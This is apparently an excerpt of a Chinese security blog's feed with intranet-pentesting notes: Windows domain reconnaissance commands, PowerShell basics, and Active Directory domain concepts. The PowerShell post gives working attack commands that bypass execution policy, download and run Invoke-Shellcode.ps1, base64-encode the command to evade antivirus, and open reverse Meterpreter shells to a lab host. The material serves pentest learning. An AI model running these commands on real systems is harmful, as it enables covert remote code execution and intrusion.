查询当前权限"></a>0x04 查询当前权限</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>通过该命令，我们一般可以区分出当前用户是属于以下哪种用户：</p><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><p>在这三种情况下，如果当前内网中存在域，那么本地普通用户是查询不到内网域信息的，而只能查询本机相关信息，但是本机管理员用户和域内用户则可以查询域内信息。</p><p>其原理在于：域内的所有查询都是通过DC实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无须额外输入账号密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此在域中除了普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”）。在本质上，机器的System用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。</p><p>比如这里是hacker域内的testuser用户：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/26.png" alt=""></p><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>可以看到当前域hacker的SID为S-1-5-21-554479669-3187065311-1765148423，域用户testuser的SID为S-1-5-21-554479669-3187065311-1765148423-1105：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/27.png" alt=""></p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure><p>输入该命令可以看到当前用户在本地组中有没有本地管理员权限，属于哪个域等。</p><p>这里看到testuser用户在本地组并没有本地管理员权限，在域中属于Domain Users组：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之Windows PowerShell基础</title>
    <link href="https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell基础/</id>
    <published>2020-02-18T13:51:31.000Z</published>
    <updated>2020-02-27T15:36:06.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要参考《内网安全攻防》。</p><p>更多PowerShell的内容可参考：<a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">https://www.pstips.net/powershell-online-tutorials</a></p><h2 id="0x01-PowerShell基本概念"><a href="#0x01-PowerShell基本概念" class="headerlink" title="0x01 PowerShell基本概念"></a>0x01 PowerShell基本概念</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><p>PowerShell需要.NET环境的支持，同时支持.NET对象，其拥有以下特点：</p><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><p>通过以下两个命令都可以查看PowerShell的版本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-Host</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">18362.628</span></span><br><span class="line">InstanceId       : <span class="number">33</span>a7b882-<span class="number">5</span>b06-<span class="number">494</span>a-<span class="number">9577</span>-ed0f51a6e8ad</span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : zh-CN</span><br><span class="line">CurrentUICulture : zh-CN</span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS E:\&gt; <span class="variable">$PSVersionTable</span>.PSVersion</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line">-----  -----  -----  --------</span><br><span class="line"><span class="number">5</span>      <span class="number">1</span>      <span class="number">18362</span>  <span class="number">628</span></span><br></pre></td></tr></table></figure><h2 id="0x02-PowerShell脚本"><a href="#0x02-PowerShell脚本" class="headerlink" title="0x02 PowerShell脚本"></a>0x02 PowerShell脚本</h2><p>PowerShell脚本其实就是一个扩展名为”.ps1”的文件，其中包含一系列PowerShell命令，每个命令显示为独立的一行。</p><h3 id="脚本运行"><a href="#脚本运行" class="headerlink" title="脚本运行"></a>脚本运行</h3><p>运行PowerShell脚本需要输入绝对路径，比如<code>E:\test.ps1</code>。如果PowerShell脚本刚好在系统目录中，则只需要<code>.\test.ps1</code>执行即可，这和Linux上执行Shell脚本是一样的。</p><p>当然，PowerShell是分32位和64位的。在64位的Windows上，同时存在x64和x86两个版本的PowerShell，并且这两个版本的执行策略互不影响，即相互独立。</p><p>x64版本的PowerShell的配置文件在<code>%WinDir%\SysWOW64\WindowsPowerShell\v1.0\</code>目录下。</p><p>运行32位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%WinDir%\SysWOW64\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>如果PowerShell脚本不能运行，可以使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>这里看到是Restricted即限制不能执行的意思。我们看下执行策略的几个值：</p><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>可以使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在PowerShell中也支持管道符<code>|</code>的使用。</p><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用<code>|</code>连接。</p><h2 id="0x03-PowerShell常用命令与利用技巧"><a href="#0x03-PowerShell常用命令与利用技巧" class="headerlink" title="0x03 PowerShell常用命令与利用技巧"></a>0x03 PowerShell常用命令与利用技巧</h2><p>在Windows命令提示符即cmd.exe中输入<code>powershell</code>命令即可切入PowerShell命令行环境。也可以直接在当前目录Shift+右键&gt;在此处打开PowerShell窗口（win10）。其中输入help命令可以显示帮助菜单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS E:\&gt; help</span><br><span class="line"></span><br><span class="line">主题</span><br><span class="line">Windows PowerShell 帮助系统</span><br><span class="line"></span><br><span class="line">简短说明</span><br><span class="line">显示有关 Windows PowerShell 的 cmdlet 及概念的帮助。</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在PowerShell中，类似cmd命令的命令称为cmdlet命令。两者的命名规范一致，都采用“动词-名词”的方式，动词部分一般是Add、New、Get、Set、Remove等。命令的别名一般兼容Windows Command和Linux Shell。另外PowerShell命令不区分大小写。</p><p>几个常用命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/4.png" alt=""></p><p>几个常用的文件操作命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/3.png" alt=""></p><p>下面以文件操作为例：</p><ul><li>新建目录：New-ltem whitecellclub-ltemType Directory；</li><li>新建文件：New-ltem light.txt-ltemType File；</li><li>删除目录：Remove-ltem whitecellclub；</li><li>显示文本内容：Get-Content test.txt；</li><li>设置文本内容：Set-Content test.txt-Value ‘’hello,word! ‘’；</li><li>追加内容：Add-Content light.txt-Value ‘’i love you ‘’；</li><li>清除内容：Clear-Content test.txt</li></ul><h3 id="PowerSploit——后渗透测试框架"><a href="#PowerSploit——后渗透测试框架" class="headerlink" title="PowerSploit——后渗透测试框架"></a>PowerSploit——后渗透测试框架</h3><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>它包含以下几个模块：</p><ul><li>CodeExecution：在目标机器执行代码；</li><li>ScriptModification：修改或准备脚本以在受感染的计算机上执行；</li><li>Persistence：向PowerShell脚本添加持久性功能；</li><li>AntivirusBypass：使PowerShell绕过防病毒；</li><li>Exfiltration：窃取数据；</li><li>Mayhem：使用PowerShell引起一般的混乱；</li><li>Privesc：帮助提升目标特权的工具；</li><li>Recon：在渗透测试的侦察阶段提供帮助的工具；</li></ul><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>由前面知道，要想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h4 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h4><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="/2020/02/18/Windows-PowerShell基础/1.png" alt=""></p><p>在实际的内网渗透中，将PowerSploit中Privesc模块的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp.ps1脚本</a>上传到目标服务器中，在目标本地执行脚本文件，命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module E:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/2.png" alt=""></p><p>这里PowerUp旨在成为依赖错误配置的常见Windows特权升级向量的交换所。运行Invoke-AllChecks将输出所有可识别的漏洞以及任何滥用功能的规范。换句话说，Invoke-AllChecks函数将检查目标主机的攻击向量以进行权限提升</p><h4 id="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"><a href="#从网站服务器中下载脚本，Bypass本地权限并隐藏执行" class="headerlink" title="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"></a>从网站服务器中下载脚本，Bypass本地权限并隐藏执行</h4><p>下载脚本的命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br></pre></td></tr></table></figure><p>几个常用参数说明如下：</p><p>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要。在默认 情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个 参数，可以绕过任意安全保护规则。在渗透测试中，通常每次运行 PowerShell 脚本时都要 使用这个参数；</p><ul><li>-WindowStyle Hidden（-W Hidden）：隐藏窗口；</li><li>-Nonlnteractive（-NonI）：非交互模式。PowerShell不为用户提供交互的提示；</li><li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件；</li><li>-noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要；</li><li>-NoLogo：启动不显示版权标志的PowerShell；</li></ul><p>这里使用PowerSploit中CodeExecution模块中<a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1" target="_blank" rel="noopener">Invoke-Shellcode.ps1</a>脚本在目标机器上执行Meterpreter Shell。</p><p>这里我们需要知道使用什么参数，直接看源码了解如何调用反向HTTPS Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/5.png" alt=""></p><p>因此，最终构造如下payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>先在Kali上打开MSF，使用后门模块<code>exploit/multi/handler</code>，并选择payload为<code>windows/meterpreter/reverse_https</code>，接着设置监听地址和端口后启动监听：</p><p><img src="/2020/02/18/Windows-PowerShell基础/6.png" alt=""></p><p>然后在Win10中的PowerShell中输入payload，发现会报如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/7.png" alt=""></p><p>此时msf是接收到反弹的请求的，但是并不会成功获得反弹的Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/8.png" alt=""></p><p>那我们换个环境，在Win7上测试一下，经过几番折腾，去掉几个payload的参数就能成功执行反弹shell（注意，在cmd命令行下双引号要改为单引号，不然报错）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoProfile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>直接在win7的cmd中输入payload：</p><p><img src="/2020/02/18/Windows-PowerShell基础/9.png" alt=""></p><p>此时在Kali的msf中成功获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/10.png" alt=""></p><p>这里注意，不能直接在win7的PowerShell终端输入该payload，会显示如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/11.png" alt=""></p><p>这可能是win7和win10的PowerShell版本不一致导致的某些差异，具体原因还未知，但我们可以使用如下形式在win7的PowerShell终端来执行反弹shell，简单地说就是设置执行策略为无限制，然后直接远程下载恶意PowerShell脚本并执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted; IEX(<span class="built_in">New-object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/12.png" alt=""></p><p>在msf中同样获取到反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/13.png" alt=""></p><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。这里使用大佬写的一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" target="_blank" rel="noopener">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><p>该脚本编码的对象必须是文本文件，这里需要先将命令保存为文本文件，然后调用该脚本编码即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># echo "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force" &gt;raw.txt</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat raw.txt </span></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force</span><br><span class="line">root@kali:~/Desktop<span class="comment"># chmod +x ps_encoder.py </span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># python ps_encoder.py -s raw.txt</span></span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到Base64编码后的命令内容之后，直接在目标主机的cmd终端上执行如下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br></pre></td></tr></table></figure><p>这里为了看下有没有错误就不添加<code>-W Hidden</code>参数设置隐藏窗口了，而且添加了还没成功反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/14.png" alt=""></p><p>然后在Kali的msf中获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础与域环境搭建</title>
    <link href="https://www.mi1k7ea.com/2020/02/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/15/内网渗透基础/</id>
    <published>2020-02-15T12:34:33.000Z</published>
    <updated>2020-03-01T05:07:58.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-内网基本概念"><a href="#0x01-内网基本概念" class="headerlink" title="0x01 内网基本概念"></a>0x01 内网基本概念</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。在这个概念中，并不存在集中管理的节点，即无服务器和客户机的区分。</p><p>怎么设置工作组？——右键我的电脑-&gt;属性-&gt;更改设置-&gt;更改：</p><p><img src="/2020/02/15/内网渗透基础/1.png" alt=""></p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p><h4 id="域控制器（DC）"><a href="#域控制器（DC）" class="headerlink" title="域控制器（DC）"></a>域控制器（DC）</h4><p>域控制器（Domain Controller，简写为DC）是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。域内的计算机若想互相访问，需要经过域控制器的审核。域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><p><img src="/2020/02/15/内网渗透基础/2.png" alt=""></p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>单域即只有一个域，通常满足小公司的需求。一般来说至少两个域服务器，一台作为DC，另一台作为备份DC。</p><h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>出于管理和其他一些需求，需要在网络中划分多个域。其中第一个域称为父域，各分部的域称为该域的子域。</p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p><img src="/2020/02/15/内网渗透基础/3.png" alt=""></p><p>多个域树可以组成一个域林。</p><h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的集合，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p><img src="/2020/02/15/内网渗透基础/4.png" alt=""></p><h4 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h4><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。</p><p>在前面域树中看到域树中的域名和DNS域名很像。因为域中的计算机是使用DNS来定位域控制器、服务器和其他计算机、网络服务的，因此域的名字就是DNS域的名字。</p><p>对于内网渗透而言，一般是通过寻找DNS服务器来确定域控制器的位置的（通常DNS服务器和域控制器配置在同一台机器上）。</p><h4 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h4><p>在域中，计算机一般分为：域控制器、成员服务器、客户机、独立服务器等。</p><p>其中域控制器是域所必需的，因为其存放活动目录数据库。</p><h5 id="域控制器"><a href="#域控制器" class="headerlink" 